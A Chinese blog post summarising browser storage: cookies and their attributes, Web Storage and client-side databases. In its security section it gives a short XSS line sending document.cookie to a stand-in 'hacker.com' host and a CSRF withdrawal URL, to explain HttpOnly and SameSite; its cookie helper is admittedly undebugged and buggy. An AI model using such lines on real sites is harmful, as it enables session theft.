---
title: 前端常用存储技术总结
date: 2016-11-11 19:10:00
categories: Javascript #CSS，HTTP，Javascript，NodeJS，框架
tags: [Javascript] #文章标签，可空，多标签请用格式，注意:后面有个空格
toc: true
comments: true
---
主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。

<!-- more -->

> by MaryTien from  http://supermaryy.com

# 一、cookie#

cookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。

## 容量限制##

1. 存储容量较小，每个域名4K左右
2. 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条
3. 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie

## 存储时长##

1. 如果设定了超时时间，cookie将在到期时失效。
2. **如果没设定，将在关闭浏览器时失效。**在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。**（区别于sessionStorage的Tab级session）**

## 典型使用场景##

1. Session管理：登录、购物车、游戏得分等用户状态

2. 保存用户个性化设置，使用偏好、主题等

3. 用户跟踪，记录和分析用户行为

## 使用注意##

1. 因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。
2. cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。

## 基本API##

**后端设置cookie：** `Set-Cookie: <cookie-name>=<cookie-value>`

后端接收到前端的请求时，返回一个包含`Set-Cookie`的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限

**前端设置cookie：**` document.cookie = "name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]"`

因为`document.cookie`是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如`jquery.cookie.js`、`js.cookie`等，下面是我的简单封装（未经调试，只是写下思路）：

```javascript
var cookieObj = {
	get:function(keyName){
		if(!keyName){
  			alert('superMary says：cookieObj.get need a param！');
  			return;
		}
		var encodedKeyName = encodeURIComponent(keyName);
		var docCookieArr = document.cookie.split(';');
		var resultCookie = docCookieArr.filter(function(item,index){
			var cookieArr = item.split('=');
  			return cookieArr[0] === encodedKeyName;
		})
		if(resultCookie.length>0){
  			return resultCookie[0].split('=')[1];
		}
		alert('superMary says：not find the cookie of'+ keyName);		
	},
	
	set:function(oCookie){
  		var cookieStr = encodeURIComponent(oCookie.keyName) + '=' + encodeURIComponent(oCookie.keyValue);
  		if(oCookie.expires){
  			cookieStr += ';expires=' + oCookie.expires;
		}
      	if(oCookie.path){
  			cookieStr += ';path=' + oCookie.path;
		}
      	if(oCookie.Domain){
  			cookieStr += ';path=' + oCookie.path;
		}
      	// secure和httpOnly...
	},
  	delCookie:function(keyName){
  		var date = new Date();
      	date.setHours(-1);
      	this.set({
          keyName:keyName,
          expires:date
		})
	}
}
```

## cookie属性##

以CSDN网站的cookie为例：

![图0_CSDN网站的cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png)

主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite


### 时间类属性 Expires / Max-Age###

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`

Expires：指定一个GMT格式的绝对时间

Max-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间


### 域类属性 Domain / Path###

`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`

1. 表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。

   例：为http://www.baidu.com/test/testCookie.html 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test

2. cookie只能被该Domain域名或其子域名下的页面访问

3. cookie只能被该Path路径或其子路径下的页面访问

   1. 二级域名间可以通过设置Domain共享Cookie，实现跨域。

      ​例如：a.baidu.com      b.baidu.com`Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;`



### 安全类属性 Secure / HttpOnly###

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;`

 **Secure**指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。

注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。

**HttpOnly**设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击

**cookie劫持类XSS攻击**

![图1_Xss攻击图解](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png)

var cookie = document.cookie;

src=‘www.hacker.com?cookie=’ + cookie 


### 安全类属性 SameSite###

1. 表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。
2. 可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击

**第三方cookie** 

简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同

![图2_第三方cookie](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png)



**CSRF攻击过程**

![图3_CSRF攻击](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png)

src=‘www.bankA.com/withdraw?money=1000&to=hackerAccount’ 

IE和Safari尚不支持，并且计划版本中也没有加入这个功能

![图4_sameSite的浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png)


# 二、localStorage / sessionStorage#

它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。

### 区别###

localStorage：会一直保存在浏览器中，除非用户手动清除
sessionStorage：存储于浏览器端，**是Tab级别的Session** ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session
以下内容均以localStorage作例子

### 存储限制###

HTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB

### 浏览器支持###

IE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48

### 用途：###

Web Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。

### 常用API###

localStorage.setItem(keyName, keyValue);
localStorage.getItem(KeyName);
localStorage.removeItem(keyName) ;
localStorage.clear () ;
localStorage.length ;

### Storage Event###

当向storage中存储数据或移除数据时，会在window对象上触发一个`storage event`，可以添加监听器进行监听。

```javascript
window.addEventListener('storage', storageEventHandler, false);
```

**注意**
事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。
只对localStorage 的改变有效，对sessionStorage无效

**用途：**
可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。

### 超出存储限制：###

**QUOTA_EXCEEDED_ERR** ：写入的数据大小超出浏览器的限制就会抛出这个异常
最佳实践是，当存储数据时使用try/catch包裹代码块。

	function setSettings() {
	  	if ('localStorage' in window && window['localStorage'] !== null) {
	      	try {
	          	localStorage.setItem('keyName', 'keyValue');
	      	} catch (e) {
	              if (e == QUOTA_EXCEEDED_ERR) {
	                      alert('Quota exceeded!');
	                  }
	        }
	 	} else {
	  		alert('Cannot store user preferences as your browser do not support local storage');
	  	}
	}
## 三、客户端数据库##

cookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。

**包括** ：Web SQL Database  / IndexedDB

**访问** ：同域名下可以访问。

**存储时间** ：永久存储，除非用户手动清除数据。

**大小限制** ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。

### Web SQL Database###

1. 可以处理复杂的关系型数据，并且使用SQL语句进行操作
2. 因为过于依赖后端SQL语言的语法，**已被Web应用工作组废弃** ，但在手机端浏览器中的的支持率仍然较高

   ![图5_Web SQL Database浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png)

**三个核心方法：** 
openDatabase：创建数据库对象
transaction：用于根据情况控制事务提交或回滚
executeSql：用于执行SQL 查询

### IndexedDB###

1. IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据
2. 大部分浏览器都已支持或支持部分功能

![图6_indexedDB浏览器支持情况](http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png)